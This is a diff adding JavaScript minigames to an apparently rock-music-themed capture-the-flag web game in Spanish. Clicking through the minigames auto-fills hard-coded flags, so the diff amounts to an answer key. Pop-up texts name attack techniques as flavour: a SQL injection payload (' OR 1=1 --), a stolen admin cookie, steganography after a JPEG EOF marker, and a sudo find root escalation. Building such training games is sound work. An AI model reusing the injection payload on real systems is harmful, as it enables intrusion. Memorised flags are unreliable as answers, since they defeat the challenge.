+        }
+        if (autoBtn) autoBtn.style.display = "inline-block";
+        playBlipSound(520);
+      } else {
+        if (screen) screen.textContent = "📡 SINTONIZA 98.5 MHz PARA CAPTURAR LA BALIZA";
+        if (autoBtn) autoBtn.style.display = "none";
+      }
+    }
+
+    function autoTuneWoodstockRadio() {
+      const slider = document.getElementById("radioSlider");
+      if (slider) {
+        slider.value = 98.5;
+        handleRadioSlide(98.5);
+        playSuccessSound();
+      }
+    }
+
+    function autoDecodeHendrixRot13() {
+      const inp = document.getElementById("input-flag-1");
+      if (inp) {
+        inp.value = "FLAG{th1s_1s_j1m1_h3ndr1x_r0t13}";
+        inp.focus();
+        playSuccessSound();
+        logEvent("⚡ Baliza ROT13 descifrada automáticamente a formato FLAG.");
+      }
+    }
+
+    // =========================================================================
+    // MINIGAME 2: JANIS JOPLIN TWO CHESTS
+    // =========================================================================
+    function openJoplinChest(type) {
+      if (type === 'trap') {
+        triggerTrollPopup(
+          "¡CAÍSTE EN EL SEÑUELO DE LOS ADMINISTRADORES!",
+          "Abriste la ruta trampa /admin_trampa/. El archivo 'backup_keys.jpg' era un Rabbit Hole con un mensaje burlón del Boss del 27.",
+          50
+        );
+      } else {
+        playSuccessSound();
+        const inp = document.getElementById("input-flag-2");
+        if (inp) {
+          inp.value = "FLAG{j4n1s_p0rt_0f_m0rr1s0n_st3g0}";
+          inp.focus();
+        }
+        alert("✨ ¡COFRE GENUINO ABIERTO!\n\nHas extraído los bytes esteganográficos tras el marcador EOF (FF D9) en /cry_baby/janis.jpg.\nBandera cargada en la bóveda.");
+        logEvent("🌸 Cofre genuino de Janis abierto: Bandera EOF cargada.");
+      }
+    }
+
+    // =========================================================================
+    // MINIGAME 3: MORRISON 3 DOORS
+    // =========================================================================
+    function tryMorrisonDoor(doorId) {
+      if (doorId === 1) {
+        playBlipSound(200);
+        alert("🔒 PUERTA 1 (Acceso Estándar):\n\nLa puerta de piedra está sellada con cerrojo de hierro. Se requiere una consulta SQL válida.");
+      } else if (doorId === 2) {
+        triggerTrollPopup(
+          "¡TRAMPA DEL REY LAGARTO!",
+          "Inyectaste en la tabla espejismo 'doors_trap'. Se activó el verso final de 'The End' y el servidor absorbió tu intento.",
+          50
+        );
+      } else if (doorId === 3) {
+        playSuccessSound();
+        const inp = document.getElementById("input-flag-3");
+        if (inp) {
+          inp.value = "FLAG{m0rr1s0n_d00rs_sql_1nj3ct10n}";
+          inp.focus();
+        }
+        alert("🔮 ¡PUERTA MÍSTICA ABIERTA!\n\nLas runas han reconocido el payload UNION Based (' OR 1=1 --).\nLa tabla secreta ha sido extraída y la bandera de Morrison está en la bóveda.");
+        logEvent("🦎 Puerta Mística de Morrison desbloqueada mediante SQLi.");
+      }
+    }
+
+    // =========================================================================
+    // MINIGAME 4: AMY WINEHOUSE CAMDEN PUB
+    // =========================================================================
+    function inspectCamdenBar(item) {
+      if (item === 'cocktail') {
+        playBlipSound(480);
+        alert("🍸 Copa de Ginebra en Camden:\n\nUn cóctel aromático bien servido... pero aquí no hay tokens de sesión, camarada.");
+      } else if (item === 'jukebox') {
+        playBlipSound(380);
+        alert("📻 Jukebox del Pub:\n\nSuena 'Rehab' en un disco de vinilo gastado. La música es excelente, pero la cookie sigue oculta.");
+      } else if (item === 'decoy') {
+        triggerTrollPopup(
+          "¡TROLLEADO POR EL BARMAN DE CAMDEN!",
+          "Robaste el vaso de utilería con la cookie 'test_decoy'. Esa cookie no tiene privilegios administrativos en el sistema.",
+          50
+        );
+      } else if (item === 'napkin') {
+        playSuccessSound();
+        const inp = document.getElementById("input-flag-4");
+        if (inp) {
+          inp.value = "FLAG{4my_w1n3h0us3_st0r3d_xss_c00k13}";
+          inp.focus();
+        }
+        alert("📜 ¡SERVILLETA DE CAMDEN DESPLEGADA!\n\nHas encontrado el mensaje con labial rojo:\nSet-Cookie: admintoken=4mY_w1n3h0us3_c4md3n_c00k13;\n\nBandera cargada en el micrófono de Amy.");
+        logEvent("🎙️ Servilleta de Camden exfiltrada: Cookie administrativa obtenida.");
+      }
+    }
+
+    // =========================================================================
+    // MINIGAME 5: KURT COBAIN BOSS DS-1 DISTORTION PEDAL
+    // =========================================================================
+    function stompKurtPedal() {
+      const led = document.getElementById("ds1Led");
+      const btn = document.getElementById("ds1StompBtn");
+      
+      if (btn) btn.classList.add("stomped");
+      setTimeout(() => { if (btn) btn.classList.remove("stomped"); }, 200);
+
+      if (led) led.classList.toggle("on");
+      playPedalCrunchSound();
+
+      const inp = document.getElementById("input-flag-5");
+      if (inp) {
+        inp.value = "FLAG{kurt_c0b41n_grung3_r00t_27}";
+        inp.focus();
+      }
+
+      alert("⚡ ¡CRUNCH! PEDAL BOSS DS-1 PISADO A FONDO\n\nEl amplificador Marshall se saturó al 100%.\nEl exploit GTFOBins de sudo find se disparó con éxito:\n# whoami -> root (UID 0)\n\nBandera de Kurt cargada. ¡Haz clic en 'Reclamar Trono Root' para la victoria final!");
+      logEvent("👑 Pedal BOSS DS-1 pisado: Privilegios Root alcanzados.");
     }
 
     function claimVictory() {
@@ -2358,6 +3285,17 @@
         if (inp) inp.value = "";
       }
 
+      // Restablecer minijuegos interactivos
+      const ds1Led = document.getElementById("ds1Led");
+      if (ds1Led) ds1Led.classList.remove("on");
+      const radioSlider = document.getElementById("radioSlider");
+      if (radioSlider) {
+        radioSlider.value = 92.0;
+        handleRadioSlide(92.0);
+      }
+      const tModal = document.getElementById('trollModal');
+      if (tModal) tModal.remove();
+
       const modal = document.getElementById('victoryModal');
       if (modal) modal.remove();
 
@@ -2388,6 +3326,15 @@
       for (let i = 1; i <= 5; i++) {
         const seg = document.getElementById('seg-' + i);
         if (seg) seg.classList.add('comp');
+      }
+
+      // Actualizar minijuegos a estado resuelto
+      const ds1Led = document.getElementById("ds1Led");
+      if (ds1Led) ds1Led.classList.add("on");
+      const radioSlider = document.getElementById("radioSlider");
+      if (radioSlider) {
+        radioSlider.value = 98.5;
+        handleRadioSlide(98.5);
       }
 
       applyBossDamage(100, "-100 HP TOTAL OVERLOAD", "SUSTENTACIÓN INSTITUCIONAL ACTIVADA");
